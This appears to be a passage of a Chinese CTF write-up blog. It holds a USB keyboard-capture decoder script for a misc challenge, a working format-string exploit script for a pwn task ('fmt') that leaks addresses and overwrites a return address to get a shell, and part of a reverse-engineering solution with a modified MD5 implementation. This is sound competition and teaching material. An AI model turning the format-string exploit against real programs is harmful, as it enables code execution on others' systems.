class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023hwsummer/3.png"><br>赛博厨子直接梭<br><img src="/mdimg/2023hwsummer/4.png"><br><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">from mypwn <span class="hljs-keyword">import</span> *</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(b<span class="hljs-string">&quot;I need a str: &quot;</span>,<span class="hljs-string">&#x27;EXIT\r%18$p%19$p%21$p&#x27;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">&#x27;0x&#x27;</span>)</span></span><br><span class="hljs-function">ret_addr </span>= <span class="hljs-built_in">leak</span>() - <span class="hljs-number">8</span><br><span class="hljs-built_in">logs</span>(ret_addr)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">leak</span>() - <span class="hljs-number">28</span> - <span class="hljs-number">0x13c6</span><br><span class="hljs-built_in">logs</span>(elf.address)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">leak</span>() - <span class="hljs-number">243</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">logs</span>(libc.address)<br><br>one = libc.address + <span class="hljs-number">0xe3b01</span><br><br>payload = b<span class="hljs-number">&#x27;</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>$hhnAAAAAAA<span class="hljs-number">&#x27;</span> + <span class="hljs-built_in">p64</span>(ret_addr)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need other str: &quot;</span>,payload)<br><br>ret_addr += <span class="hljs-number">16</span><br>one1 = one &amp; <span class="hljs-number">0xffff</span><br>one2 = (one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-meta">#dbg()</span><br>payload = b<span class="hljs-number">&#x27;</span>EXIT\r%<span class="hljs-string">&#x27; + str(one1-5).encode() + b&#x27;</span>c%<span class="hljs-number">9</span>$hn<span class="hljs-number">&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0x18</span>,b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(ret_addr)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need a str: &quot;</span>,payload)<br>payload = b<span class="hljs-number">&#x27;</span>%<span class="hljs-string">&#x27; + str(one2).encode() + b&#x27;</span>c%<span class="hljs-number">9</span>$hn<span class="hljs-number">&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0x18</span>,b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(ret_addr + <span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need other str: &quot;</span>,payload)<br><br><span class="hljs-built_in">shell</span>()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Animals"><a href="#Animals" class="headerlink" title="Animals"></a>Animals</h3><p>程序加了很多花指令，使用idapython进行去花。<br>修复完成后所有程序爆红，在这里更改成全部都是主函数范围内，并记录结束地址：<code>406DA8</code><br>发现MD5函数，跟进去发现这里MD5的码表被转换了，1和2交换，3和4交换，所以，改写md5.c文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;md5.h&quot;</span></span><br> <br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> PADDING[]=&#123;<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br>                         <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Init</span><span class="hljs-params">(MD5_CTX *context)</span></span><br><span class="hljs-function"></span>&#123;<br>     context-&gt;count[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>     context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>     context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0xEFCDAB89</span>;<br>     context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0x67452301</span>;<br>     context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x10325476</span>;<br>     context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x98BADCFE</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Update</span><span class="hljs-params">(MD5_CTX *context,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inputlen)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,index = <span class="hljs-number">0</span>,partlen = <span class="hljs-number">0</span>;<br>    index = (context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>;<br>    partlen = <span class="hljs-number">64</span> - index;<br>    context-&gt;count[<span class="hljs-number">0</span>] += inputlen &lt;&lt; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span>(context-&gt;count[<span class="hljs-number">0</span>] &lt; (inputlen &lt;&lt; <span class="hljs-number">3</span>))<br>       context-&gt;count[<span class="hljs-number">1</span>]++;<br>    context-&gt;count[<span class="hljs-number">1</span>] += inputlen &gt;&gt; <span class="hljs-number">29</span>;<br>    <br>    <span class="hljs-keyword">if</span>(inputlen &gt;= partlen)<br>    &#123;<br>       <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],input,partlen);<br>       <span class="hljs-built_in">MD5Transform</span>(context-&gt;state,context-&gt;buffer);<br>       <span class="hljs-keyword">for</span>(i = partlen;i+<span class="hljs-number">64</span> &lt;= inputlen;i+=<span class="hljs-number">64</span>)<br>           <span class="hljs-built_in">MD5Transform</span>(context-&gt;state,&amp;input[i]);<br>       index = <span class="hljs-number">0</span>;        <br>    &#125;  <br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        i = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],&amp;input[i],inputlen-i);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Final</span><span class="hljs-params">(MD5_CTX *context,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> digest[<span class="hljs-number">16</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>,padlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> bits[<span class="hljs-number">8</span>];<br>    index = (context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>;<br>    padlen = (index &lt; <span class="hljs-number">56</span>)?(<span class="hljs-number">56</span>-index):(<span class="hljs-number">120</span>-index);<br>    <span class="hljs-built_in">MD5Encode</span>(bits,context-&gt;count,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">MD5Update</span>(context,PADDING,padlen);<br>    <span class="hljs-built_in">MD5Update</span>(context,bits,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">MD5Encode</span>(digest,context-&gt;state,<span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Encode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *output,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(j &lt; len)<br>    &#123;<br>         output[j] = input[i] &amp; <span class="hljs-number">0xFF</span>;  <br>         output[j+<span class="hljs-number">1</span>] = (input[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         output[j+<span class="hljs-number">2</span>] = (input[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         output[j+<span class="hljs-number">3</span>] = (input[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         i++;<br>         j+=<span 